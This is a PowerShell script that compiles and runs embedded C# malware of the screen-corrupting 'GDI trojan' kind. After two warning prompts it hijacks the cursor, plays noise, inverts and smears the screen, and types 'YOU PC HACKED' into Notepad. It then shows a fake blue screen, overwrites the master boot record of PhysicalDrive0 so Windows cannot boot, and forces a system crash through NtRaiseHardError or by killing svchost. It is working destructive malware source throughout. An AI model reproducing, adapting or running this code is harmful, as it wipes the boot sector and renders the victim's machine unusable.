Add-Type -AssemblyName System.Windows.Forms

$msg1 = "This is destructive (maybe), u really run this app?"
$title1 = "Security Warning - Step 1/2"
$result1 = [System.Windows.Forms.MessageBox]::Show($msg1, $title1, [System.Windows.Forms.MessageBoxButtons]::YesNo, [System.Windows.Forms.MessageBoxIcon]::Warning)

if ($result1 -ne [System.Windows.Forms.DialogResult]::Yes) {
    Exit
}

$msg2 = "YOU ACCEPT?"
$title2 = "Final Warning - Step 2/2"
$result2 = [System.Windows.Forms.MessageBox]::Show($msg2, $title2, [System.Windows.Forms.MessageBoxButtons]::YesNo, [System.Windows.Forms.MessageBoxIcon]::Stop)

if ($result2 -ne [System.Windows.Forms.DialogResult]::Yes) {
    Exit
}

Set-ExecutionPolicy Bypass -Scope Process -Force

$randId = Get-Random -Minimum 10000 -Maximum 99999
$namespaceName = "ExtremeChaosVlad_$randId"

$code = @"
using System;
using System.Drawing;
using System.Runtime.InteropServices;
using System.Threading;
using System.Diagnostics;
using System.Windows.Forms;
using System.IO;

namespace $namespaceName {
    public class PayloadRunner {
        [DllImport("user32.dll")] public static extern IntPtr GetDC(IntPtr hwnd);
        [DllImport("user32.dll")] public static extern int ReleaseDC(IntPtr hwnd, IntPtr hdc);
        [DllImport("gdi32.dll")] public static extern bool BitBlt(IntPtr hdcDest, int nXDest, int nYDest, int nWidth, int nHeight, IntPtr hdcSrc, int nXSrc, int nYSrc, uint dwRop);
        [DllImport("gdi32.dll")] public static extern bool StretchBlt(IntPtr hdcDest, int nXDest, int nYDest, int nWidth, int nHeight, IntPtr hdcSrc, int nXSrc, int nYSrc, int nWidthSrc, int nHeightSrc, uint dwRop);
        [DllImport("user32.dll")] public static extern int GetSystemMetrics(int nIndex);
        [DllImport("user32.dll")] public static extern short GetAsyncKeyState(int vKey);
        [DllImport("user32.dll")] public static extern bool SetCursorPos(int X, int Y);
        [DllImport("user32.dll")] public static extern IntPtr LoadIcon(IntPtr hInstance, int lpIconName);
        [DllImport("user32.dll")] public static extern bool DrawIcon(IntPtr hdc, int x, int y, IntPtr hIcon);
        [DllImport("user32.dll")] public static extern bool InvalidateRect(IntPtr hWnd, IntPtr lpRect, bool bErase);
        [DllImport("gdi32.dll")] public static extern IntPtr CreateSolidBrush(uint crColor);
        [DllImport("gdi32.dll")] public static extern IntPtr SelectObject(IntPtr hdc, IntPtr hgdiobj);
        [DllImport("gdi32.dll")] public static extern bool DeleteObject(IntPtr hObject);
        [DllImport("gdi32.dll")] public static extern bool PatBlt(IntPtr hdc, int nXLeft, int nYLeft, int nWidth, int nHeight, uint dwRop);
        [DllImport("ntdll.dll", SetLastError = true)] public static extern uint RtlAdjustPrivilege(int privilege, bool enable, bool currentThread, out bool enabled);
        [DllImport("ntdll.dll", SetLastError = true)] public static extern uint NtRaiseHardError(uint errorStatus, uint numberOfParameters, uint unicodeStringParameterMask, IntPtr parameters, uint validResponseOption, out uint response);

        [DllImport("kernel32.dll", SetLastError = true, CharSet = CharSet.Auto)]
        public static extern IntPtr CreateFile(string lpFileName, uint dwDesiredAccess, uint dwShareMode, IntPtr lpSecurityAttributes, uint dwCreationDisposition, uint dwFlagsAndAttributes, IntPtr hTemplateFile);

        [DllImport("kernel32.dll", SetLastError = true)]
        public static extern bool WriteFile(IntPtr hFile, byte[] lpBuffer, uint nNumberOfBytesToWrite, out uint lpNumberOfBytesWritten, IntPtr lpOverlapped);

        [DllImport("kernel32.dll", SetLastError = true)]
        public static extern bool CloseHandle(IntPtr hObject);

        [StructLayout(LayoutKind.Sequential)]
        public struct WAVEFORMATEX {
            public ushort wFormatTag; public ushort nChannels; public uint nSamplesPerSec;
            public uint nAvgBytesPerSec; public ushort nBlockAlign; public ushort wBitsPerSample; public ushort cbSize;
        }

        [StructLayout(LayoutKind.Sequential)]
        public struct WAVEHDR {
            public IntPtr lpData; public uint dwBufferLength; public uint dwBytesRecorded;
            public IntPtr lpUser; public uint dwFlags; public uint dwLoops; public IntPtr lpNext; public IntPtr reserved;
        }

        [DllImport("winmm.dll")] public static extern int waveOutOpen(out IntPtr hWaveOut, uint uDeviceID, ref WAVEFORMATEX lpFormat, IntPtr dwCallback, IntPtr dwInstance, uint fdwOpen);
        [DllImport("winmm.dll")] public static extern int waveOutPrepareHeader(IntPtr hWaveOut, ref WAVEHDR lpWaveOutHdr, uint uSize);
        [DllImport("winmm.dll")] public static extern int waveOutWrite(IntPtr hWaveOut, ref WAVEHDR lpWaveOutHdr, uint uSize);

        const uint SRCINVERT = 0x00660046;
        const uint SRCCOPY   = 0x00CC0220;
        const uint SRCPAINT  = 0x00EE0086;
        const uint PATINVERT = 0x005A0049;
        const uint DSTINVERT = 0x00550009;
        const uint NOTSRCOPY = 0x00330008;
        const uint SRCAND    = 0x008800C6;

        public static int currentPayload = 1;
        public static bool isRunning = true;
        public static int globalAudioTimer = 0;

        public static void AudioThread() {
            IntPtr hWaveOut;
            WAVEFORMATEX wfx = new WAVEFORMATEX();
            wfx.wFormatTag = 1; wfx.nChannels = 1; wfx.nSamplesPerSec = 16000;
            wfx.nAvgBytesPerSec = 16000; wfx.nBlockAlign = 1; wfx.wBitsPerSample = 8; wfx.cbSize = 0;

            if (waveOutOpen(out hWaveOut, 0xFFFFFFFF, ref wfx, IntPtr.Zero, IntPtr.Zero, 0) != 0) return;

            int bufferSize = 2000;
            byte[] buffer = new byte[bufferSize];
            GCHandle handle = GCHandle.Alloc(buffer, GCHandleType.Pinned);

            WAVEHDR header = new WAVEHDR();
            header.lpData = handle.AddrOfPinnedObject();
            header.dwBufferLength = (uint)bufferSize;

            while (isRunning) {
                for (int i = 0; i < bufferSize; i++) {
                    byte b = 0;
                    int t = Interlocked.Increment(ref globalAudioTimer);

                    switch (currentPayload) {
                        case 1: b = (byte)(((t * (t >> 8 | t >> 9)) & 128) + ((t * (t >> 3 | t >> 12)) & 64) ^ (t >> 4)); break;
                        case 2: b = (byte)((t * (t >> 5 | t >> 8) ^ (t >> 3)) + ((t * (t >> 11)) & 127)); break;
                        case 3: b = (byte)(((t * 3 & t >> 4) | (t * 5 & t >> 7) ^ (t * (t >> 8))) * (t >> 2 & 15)); break;
                        case 4: b = (byte)((t >> 3) * (t >> 4) ^ (t >> 6) + (t * (t >> 9 | t >> 13))); break;
                        case 5: b = (byte)((t * (t >> 8 & 15) ^ (t >> 3)) + (t >> 10) * (t >> 2) ^ (t * 7)); break;
                        case 6: b = (byte)((t * 7 & t >> 3) ^ (t * 3 & t >> 4) + ((t >> 9) * (t >> 2)) | (t * 13) ^ (t >> 1)); break;
                        case 7: b = (byte)((t * (t >> 11 | t >> 5) & 63) * (t >> 3) ^ (t * (t >> 7)) + (t * 9)); break;
                    }
                    buffer[i] = b;
                }
                waveOutPrepareHeader(hWaveOut, ref header, (uint)Marshal.SizeOf(header));
                waveOutWrite(hWaveOut, ref header, (uint)Marshal.SizeOf(header));
                Thread.Sleep(120);
            }
        }

        public static void Run() {
            int w = GetSystemMetrics(0);
            int h = GetSystemMetrics(1);
            Random r = new Random();

            Thread aThread = new Thread(AudioThread);
            aThread.IsBackground = true;
            aThread.Start();

            DateTime start = DateTime.Now;
            int appTimer = 0;

            Bitmap memeLogo = new Bitmap(180, 180);
            using (Graphics g = Graphics.FromImage(memeLogo)) {
                g.Clear(Color.FromArgb(250, 20, 50));
                using (Brush bWhite = new SolidBrush(Color.White), bYellow = new SolidBrush(Color.Yellow)) {
                    g.FillEllipse(bWhite, 15, 15, 150, 150);
                    g.FillRectangle(bYellow, 45, 55, 25, 15);
                    g.FillRectangle(bYellow, 110, 55, 25, 15);
                    using (Pen pBlack = new Pen(Color.Black, 6)) {
                        g.DrawArc(pBlack, 45, 85, 90, 50, 0, -180);
                    }
                }
            }

            while (isRunning) {
                if ((GetAsyncKeyState(0x1B) & 0x8000) != 0) break;

                IntPtr hdc = GetDC(IntPtr.Zero);
                int elapsed = (int)(DateTime.Now - start).TotalSeconds;

                if (elapsed >= 210) {
                    isRunning = false;
                    break;
                }

                currentPayload = (elapsed / 30) + 1;

                SetCursorPos(r.Next(0, w), r.Next(0, h));

                appTimer++;
                if (appTimer % 35 == 0) {
                    try {
                        Process.Start("notepad.exe");
                        Thread.Sleep(80);
                        SendKeys.SendWait("YOU PC HACKED{ENTER}");
                        SendKeys.SendWait("RECOVERY? IMPOSSIBLE{ENTER}");
                        SendKeys.SendWait("GUESS CODE: 493938{ENTER}");
                    } catch {}
                }
                if (appTimer % 120 == 0) {
                    try {
                        foreach (var proc in Process.GetProcessesByName("notepad")) { proc.Kill(); }
                    } catch {}
                }

                using (Graphics gScreen = Graphics.FromHdc(hdc)) {
                    int cubeX = (int)(Math.Cos(elapsed * 25) * (w / 2.5) + (w / 2) - 90);
                    int cubeY = (int)(Math.Sin(elapsed * 30) * (h / 2.5) + (h / 2) - 90);
                    gScreen.DrawImage(memeLogo, cubeX, cubeY);
                }

                switch (currentPayload) {
                    case 1:
                        for (int i = 0; i < 200; i++) {
                            BitBlt(hdc, r.Next(-100, w), r.Next(-100, h), r.Next(150, 500), r.Next(150, 500), hdc, r.Next(0, w), r.Next(0, h), SRCINVERT);
                        }
                        break;
                    case 2:
                        for (int i = 0; i < 250; i++) {
                            int sx = r.Next(0, w);
                            int sy = r.Next(0, h);
                            BitBlt(hdc, sx + r.Next(-150, 150), sy + r.Next(-50, 120), r.Next(200, 600), r.Next(80, 200), hdc, sx, sy, SRCCOPY);
                        }
                        break;
                    case 3:
                        StretchBlt(hdc, -200, -200, w + 400, h + 400, hdc, 0, 0, w, h, SRCPAINT);
                        BitBlt(hdc, r.Next(-150, 150), r.Next(-150, 150), w, h, hdc, 0, 0, NOTSRCOPY);
                        break;
                    case 4:
                        PatBlt(hdc, 0, 0, w, h, r.Next(0, 2) == 0 ? PATINVERT : DSTINVERT);
                        StretchBlt(hdc, r.Next(-100, 100), r.Next(-100, 100), w + 200, h + 200, hdc, 0, 0, w, h, SRCINVERT);
                        break;
                    case 5:
                        for (int i = 0; i < 400; i++) {
                            int tw = r.Next(20, 300);
                            int th = r.Next(20, 300);
                            BitBlt(hdc, r.Next(0, w), r.Next(0, h), tw, th, hdc, r.Next(0, w), r.Next(0, h), SRCAND);
                        }
                        break;
                    case 6:
                        DrawIcon(hdc, r.Next(0, w), r.Next(0, h), LoadIcon(IntPtr.Zero, 32512));
                        DrawIcon(hdc, r.Next(0, w), r.Next(0, h), LoadIcon(IntPtr.Zero, 32513));
                        DrawIcon(hdc, r.Next(0, w), r.Next(0, h), LoadIcon(IntPtr.Zero, 32515));
                        DrawIcon(hdc, r.Next(0, w), r.Next(0, h), LoadIcon(IntPtr.Zero, 32516));
                        BitBlt(hdc, r.Next(-200, 200), r.Next(-200, 200), w, h, hdc, 0, 0, SRCCOPY);
                        break;
                    case 7:
                        BitBlt(hdc, 0, 0, w, h, hdc, 0, 0, NOTSRCOPY);
                        StretchBlt(hdc, -100, -100, w + 200, h + 200, hdc, 0, 0, w, h, SRCINVERT);
                        PatBlt(hdc, 0, 0, w, h, DSTINVERT);
                        BitBlt(hdc, r.Next(-50, 50), r.Next(-50, 50), w, h, hdc, 0, 0, SRCPAINT);
                        break;
                }

                ReleaseDC(IntPtr.Zero, hdc);
                Thread.Sleep(1);
            }

            InvalidateRect(IntPtr.Zero, IntPtr.Zero, true);

            // 1. FIRST TRIGGER BLUE SCREEN OF DEATH (BSOD) WITH REQUESTED TEXT
            IntPtr finalHdc = GetDC(IntPtr.Zero);
            using (Graphics gFinal = Graphics.FromHdc(finalHdc)) {
                gFinal.Clear(Color.FromArgb(0, 120, 215)); // Windows BSOD Blue Color
                using (Font fontHeader = new Font("Consolas", 28, FontStyle.Bold))
                using (Font fontBody = new Font("Consolas", 20, FontStyle.Regular))
                using (Brush brushWhite = new SolidBrush(Color.White)) {
                    gFinal.DrawString(":(", new Font("Segoe UI", 60, FontStyle.Bold), brushWhite, 40, 40);
                    gFinal.DrawString("YOU PC HACKED", fontHeader, brushWhite, 40, 160);
                    gFinal.DrawString("RECOVERY? IMPOSSIBLE", fontBody, brushWhite, 40, 230);
                    gFinal.DrawString("GUESS CODE: 493938", fontBody, brushWhite, 40, 280);
                }
            }
            ReleaseDC(IntPtr.Zero, finalHdc);
            Thread.Sleep(4000);

            // 2. THEN DESTROY MBR AFTER BSOD DISPLAY SO WINDOWS CANNOT BOOT ANYMORE
            try {
                IntPtr hDrive = CreateFile(@"\\.\PhysicalDrive0", 0x40000000, 0x00000001 | 0x00000002, IntPtr.Zero, 3, 0, IntPtr.Zero);
                if (hDrive != (IntPtr)(-1)) {
                    byte[] mbrData = new byte[512];
                    string mbrText = "YOU PC HACKED. RECOVERY? IMPOSSIBLE. GUESS CODE: 493938";
                    byte[] textBytes = System.Text.Encoding.ASCII.GetBytes(mbrText);
                    Array.Copy(textBytes, 0, mbrData, 0, Math.Min(textBytes.Length, 440));
                    
                    mbrData[510] = 0x55;
                    mbrData[511] = 0xAA;

                    uint bytesWritten;
                    WriteFile(hDrive, mbrData, 512, out bytesWritten, IntPtr.Zero);
                    CloseHandle(hDrive);
                }
            } catch {}

            // 3. FINALLY FORCE CRASH KERNEL SYSTEM PROCESS
            try {
                bool privilegeEnabled;
                uint response;
                RtlAdjustPrivilege(19, true, false, out privilegeEnabled);
                NtRaiseHardError(0xC0000022, 0, 0, IntPtr.Zero, 6, out response);
            } catch {
                try {
                    Process.Start(new ProcessStartInfo("cmd.exe", "/c taskkill /f /im svchost.exe") { WindowStyle = ProcessWindowStyle.Hidden });
                } catch {}
            }
        }
    }
}
"@

$compiled = Add-Type -TypeDefinition $code -Language CSharp -ReferencedAssemblies "System.Windows.Forms", "System.Drawing" -PassThru
$runner = $compiled | Where-Object { $_.Name -eq "PayloadRunner" }
$runner::Run()